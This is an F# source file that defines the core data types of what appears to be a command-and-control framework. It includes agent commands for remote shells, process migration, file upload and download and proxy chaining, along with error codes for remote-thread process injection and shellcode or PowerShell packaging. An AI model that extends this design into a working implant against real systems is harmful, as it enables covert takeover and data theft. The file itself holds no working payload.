namespace ES.Alan.Core

open System
open System.Text
open Microsoft.FSharp.Reflection
open System.IO
open System.Reflection.PortableExecutable

module Entities =
    type Packaging =
        | Executable
        | DLL
        | PowerShell
        | Shellcode
        | Vanilla

    type CpuBitness =
        | Bitness32
        | Bitness64
        with 
            override this.ToString() =
                match this with
                | Bitness32 -> "x86"
                | Bitness64 -> "x64"

            member this.GetSize() =
                match this with
                | Bitness32 -> 4
                | Bitness64 -> 8

            static member FromPeContent(fileContent: Byte array) =
                use memStream = new MemoryStream(fileContent)
                use peReader = new PEReader(memStream)
                if peReader.PEHeaders.CoffHeader.Characteristics.HasFlag(Characteristics.Bit32Machine)
                then CpuBitness.Bitness32 else CpuBitness.Bitness64

            static member FromString(rawValue: String) =
                let value = rawValue.Trim()
                let bitnessTypes = 
                    FSharpType.GetUnionCases(typeof<CpuBitness>)
                    |> Array.map(fun u -> u.Name)
                match FSharpType.GetUnionCases typeof<CpuBitness> |> Array.filter (fun case -> case.Name.Equals(value, StringComparison.OrdinalIgnoreCase)) with
                |[|case|] -> FSharpValue.MakeUnion(case,[||]) :?> CpuBitness
                |_ -> 
                    if value.Equals("x64", StringComparison.OrdinalIgnoreCase) then CpuBitness.Bitness64
                    elif value.Equals("x86", StringComparison.OrdinalIgnoreCase) then CpuBitness.Bitness32
                    else failwith("Unknow bitness type: " + value)

    type ServerError =
        | ProcessingException of String
        | AgentNotGeneratedFromThisServer of String
        | DataIntegrityFails

    type ClientErrorCode =
        | ErrorOK = 0x00000000u
        | ErrorPipeCreation = 0xc0000001u
        | ErrorEventCreation = 0xc0000002u
        | ErrorInjection = 0xc0000003u
        | ErrorPipeServerConnect = 0xc0000004u
        | ErrorPipeWrite = 0xc0000005u
        | ErrorEventNotSignaled = 0xc0000006u
        | ErrorTargetFileNotFound = 0xc0000007u
        | ErrorAllocMemory = 0xc0000008u
        | ErrorDirectoryAccessError = 0xc0000009u
        | ErrorFileAccessError = 0xc000000au
        | ErrorJsonConversion = 0xc000000bu
        | ErrorBase64Decode = 0xc000000cu
        | ErrorProcessCreation = 0xc000000du
        | ErrorMissingData = 0xc000000eu
        | ErrorInjectionOpenProcess = 0xc0001001u
        | ErrorInjectionVirtualAlloc = 0xc0001002u
        | ErrorInjectionWriteProcessMemory = 0xc0001003u
        | ErrorInjectionCreateRemoteThread = 0xc0001004u
        | ErrorInjectionEnableDynamicCode = 0xc0001005u
        | ErrorInterceptorNotstarted = 0xc0002001u
        | ErrorInterceptorNamedPipeServerDown = 0xc0002002u
        | ErrorInterceptorNamedPipeClient = 0xc0002003u
        | ErrorInterceptorNotConnected = 0xc0002004u
        | ErrorUnknown = 0xffffffffu

    type ErrorFormatter =
        static member Format(error: ClientErrorCode, data: String) =
            match error with
            | ClientErrorCode.ErrorOK -> "Operation completed successfully"
            | ClientErrorCode.ErrorPipeCreation -> "Pipe creation error"
            | ClientErrorCode.ErrorEventCreation -> "Event creation error"
            | ClientErrorCode.ErrorInjection -> "Injection error"
            | ClientErrorCode.ErrorPipeServerConnect -> "Pipe server not connected"
            | ClientErrorCode.ErrorPipeWrite -> "Pipe write error"
            | ClientErrorCode.ErrorEventNotSignaled -> "Event not signaled"
            | ClientErrorCode.ErrorTargetFileNotFound -> "Target file not found"
            | ClientErrorCode.ErrorAllocMemory -> "Memory allocation error"
            | ClientErrorCode.ErrorDirectoryAccessError -> "Directory access error"
            | ClientErrorCode.ErrorFileAccessError -> "File access error"
            | ClientErrorCode.ErrorJsonConversion -> "JSON string conversion error"
            | ClientErrorCode.ErrorBase64Decode -> "Base64 string conversion error"
            | ClientErrorCode.ErrorProcessCreation -> String.Format("Process creation error, OS error: {0}", data)
            | ClientErrorCode.ErrorInjectionOpenProcess -> "Open process error"
            | ClientErrorCode.ErrorInjectionVirtualAlloc -> "Virtual memory allocation error"
            | ClientErrorCode.ErrorInjectionWriteProcessMemory -> "Write process memory error"
            | ClientErrorCode.ErrorInjectionCreateRemoteThread -> "Create remote thread error"
            | ClientErrorCode.ErrorInjectionEnableDynamicCode -> "The target process has Dynamic code prohibited. Unable to disable it (probably due to missing privileges)"
            | ClientErrorCode.ErrorInterceptorNotstarted -> "Unable to create the agent pipe to read the process output."
            | ClientErrorCode.ErrorInterceptorNamedPipeServerDown -> "Unable to connect to the agent to read the process output."
            | ClientErrorCode.ErrorInterceptorNamedPipeClient -> "The code to read output from the remote process did not correctly started."
            | ClientErrorCode.ErrorInterceptorNotConnected -> "Unable to initialize the code to read output from the remote process."
            | ClientErrorCode.ErrorMissingData -> String.Format("Missing mandatory field: {0}", data)
            | ClientErrorCode.ErrorUnknown -> String.Format("Unknown error code: {0}", error)            
            | _ -> failwith(String.Format("Unrecognized error code: {0}", error))

        static member FormatCode(errorCode: UInt32, data: String) =
            let error = Microsoft.FSharp.Core.LanguagePrimitives.EnumOfValue<uint32, ClientErrorCode>(errorCode)
            ErrorFormatter.Format(error, data)

    type RequestType =
        | AskForCommand = 1
        | CommandData = 2        
        | RegistAgent = 3
        | CommandResult = 4

    type AgentCommandType =
        | Registration = 1
        | NoCommand = 2
        | TerminateAgent = 3
        | RunShellCommand = 4
        | TerminateShell = 5
        | GetSystemInfo = 6
        | GetExtendedSystemInfo = 7
        | UpdateConfig = 8
        | GetConfig = 9
        | PublicIP = 10
        | Migrate = 11
        | GetProcessList = 12
        | DownloadFiles = 13
        | UploadFiles = 14
        | AgentSleep = 15
        | KillProcess = 16
        | RunProgram = 17        
        | ExecCommand = 18
        | ProxyUse = 19
        | ProxyClose = 20
        | ProxyStop = 21
        | CreateProxyChain = 22
        | StopProxyChain = 23
        | ProxyInfo = 24

    type ListenerType = 
        | Http
        | Https
        with 
            override this.ToString() =
                match this with
                | Http -> "http"
                | Https -> "https"

    type PacketState =
        | NoMorePackets = 0
        | MorePackets = 1        

    type Packet<'T> = {        
        Id: Int32
        Sequence: Int32
        State: PacketState
        Type: 'T
        Data: Byte array
    } with
        member this.DataString() =
            Encoding.UTF8.GetString(this.Data)

        static member Create(data: Byte array, id: Int32, t: 'T) = {
            Data = data
            Type = t
            Id = id
            Sequence = 0
            State = PacketState.NoMorePackets
        }

        static member CreateNoData(id: Int32, t: 'T) = {
            Data = Array.empty
            Type = t
            Id = id
            Sequence = 0
            State = PacketState.NoMorePackets
        }

    type AgentMessage = {
        SessionId: String
        EntryPoint: String
        AgentAddress: String
        AgentPort: Int32
        Packets: Packet<RequestType> array
        SessionKey: Byte array
        ListenerType: ListenerType
    }

    type Proxy = {
        Id: UInt32
        Address: String
        Port: Int32
        Username: String
        Password: String
        Type: String
        Chain: Proxy option
    } with
        member this.GetCleanId() =
            this.Id.ToString("X").TrimStart([|'0'; 'x'|])

        member this.GetFullAddress() =
            match ProxyType.Parse(this.Type) with
            | ProxyType.Auto ->
                String.Format("Auto")
            | _ ->
                String.Format("{0}://{1}:{2}@{3}:{4}", this.Type, this.Username, this.Password, this.Address, this.Port)

    type Agent = {
        Id: UInt32
        SessionId: String
        ProcessId: Int32
        Bitness: CpuBitness
        StartTime: DateTime
        LastConnected: DateTime
        Address: String
        Port: Int32
        EntryPoint: String
        Settings: AgentSettings
        Version: String
        ListenerType: ListenerType
        Proxy: Proxy option
    } with
        member this.GetCleanId() =
            this.Id.ToString("X").TrimStart([|'0'; 'x'|])

    type AgentCommand = {
        Id: Int32
        Type: AgentCommandType
        Data: Byte array
        // this property set a callback that wait for a response from the agent
        ExpectResponse: Boolean
        // the context is used to pass data to the server message response handler. 
        // It is used to maintain session data between the messages exchanged to process
        // a given message,
        Context: Object option
    } with
        static member NoCommand(id: Int32) = {
            Id = id
            Type = AgentCommandType.NoCommand
            Data = Array.empty
            ExpectResponse = false
            Context = None
        }

    type EndpointInfo = {
        BindingIp: String
        BindingPort: Int32
        Type: ListenerType
        Entrypoint: String
    }

    [<CLIMutable>]
    type Endpoint = {
        Id: Int32
        AgentId: UInt32
        SessionCookieName: String
        Entrypoint: String
    }